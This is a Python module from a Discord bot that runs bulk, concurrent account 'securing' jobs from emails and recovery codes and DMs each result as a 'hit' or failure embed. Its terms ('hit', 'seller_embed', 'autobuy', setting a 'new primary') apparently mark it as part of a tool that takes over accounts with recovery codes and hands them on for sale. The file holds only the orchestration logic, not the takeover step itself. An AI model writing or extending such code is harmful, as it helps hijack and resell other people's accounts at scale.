import asyncio
import logging
from typing import Awaitable, Callable, TypeVar

import discord

from securing.build_embeds import build_failure_embed
from ui.modals.recovery_code import _send_early_credentials, _send_failure_dm

log = logging.getLogger(__name__)

T = TypeVar("T")


async def _secure_one(
    user: discord.User | discord.Member,
    email: str,
    secure_fn: Callable[..., Awaitable[T]],
) -> dict:
    try:
        # Prefer early-credentials notify when the secure fn accepts it
        try:
            account = await secure_fn(
                on_credentials=lambda creds: _send_early_credentials(user, creds),
            )
        except TypeError:
            account = await secure_fn()
    except Exception as e:
        log.exception("recovery_secure crashed for %s during bulk", email)
        fail_embed = build_failure_embed(
            email,
            {},
            "An unexpected error occurred during securing.",
            error=f"{e.__class__.__name__}: {e}",
        )
        await _send_failure_dm(user, fail_embed)
        return {"email": email, "status": "failure", "note": "exception"}

    if isinstance(account, dict) and account.get("failed"):
        # Bulk from /secure is admin — prefer hit_embed (new primary)
        await _send_failure_dm(
            user, account.get("hit_embed") or account["seller_embed"]
        )
        return {
            "email": email,
            "status": "failure",
            # Keep summary notes short — Discord embed fields max out at 1024 chars.
            "note": str(account.get("reason") or "failed")[:120],
        }

    if account == "invalid":
        fail_embed = build_failure_embed(
            email,
            {},
            "Recovery code was rejected or invalid.",
            error="invalid",
        )
        await _send_failure_dm(user, fail_embed)
        return {"email": email, "status": "failure", "note": "invalid credentials"}

    # Legacy callers sometimes returned a plain error string
    if isinstance(account, str) and account not in ("", "invalid"):
        fail_embed = build_failure_embed(
            email,
            {},
            account[:200],
            error=account[:200],
        )
        await _send_failure_dm(user, fail_embed)
        return {"email": email, "status": "failure", "note": account[:120]}

    if not account:
        # recover() used to return None with no embed — those accounts vanished from DMs.
        fail_embed = build_failure_embed(
            email,
            {},
            "Securing returned no result (recovery likely failed before credentials were set).",
            error="empty result",
        )
        await _send_failure_dm(user, fail_embed)
        return {"email": email, "status": "failure", "note": "empty result"}

    try:
        # Bulk /secure is admin — hit_embed includes new primary.
        # Autobuy has its own path and uses seller_embed there.
        hit_embed = account.get("hit_embed") or account["seller_embed"]
        await user.send(embed=hit_embed)
        return {"email": email, "status": "hit"}
    except discord.Forbidden:
        return {"email": email, "status": "hit", "note": "DMs disabled"}
    except KeyError:
        log.exception("Success result missing expected keys for %s", email)
        await _send_failure_dm(
            user, account.get("hit_embed") or account.get("seller_embed")
        )
        return {"email": email, "status": "failure", "note": "incomplete result"}


async def run_bulk_parallel(
    user: discord.User | discord.Member,
    jobs: list[tuple[str, Callable[[], Awaitable[T]]]],
    *,
    max_concurrent: int | None = None,
) -> tuple[int, int, list[str]]:
    if not jobs:
        return 0, 0, []

    limit = max_concurrent if max_concurrent and max_concurrent > 0 else len(jobs)
    semaphore = asyncio.Semaphore(limit)

    async def _run(email: str, secure_fn: Callable[[], Awaitable[T]]) -> dict:
        async with semaphore:
            return await _secure_one(user, email, secure_fn)

    results = await asyncio.gather(
        *[_run(email, fn) for email, fn in jobs],
        return_exceptions=True,
    )

    hits = 0
    failures = 0
    failed_emails: list[str] = []

    for i, result in enumerate(results):
        email = jobs[i][0]
        if isinstance(result, Exception):
            log.exception("Unhandled bulk task error for %s", email, exc_info=result)
            failures += 1
            failed_emails.append(f"`{email}` (exception)")
            continue

        if result["status"] == "hit":
            hits += 1
            if result.get("note"):
                failed_emails.append(f"`{email}` ({result['note']})")
        else:
            failures += 1
            failed_emails.append(f"`{email}` ({result.get('note', 'failed')})")

    return hits, failures, failed_emails
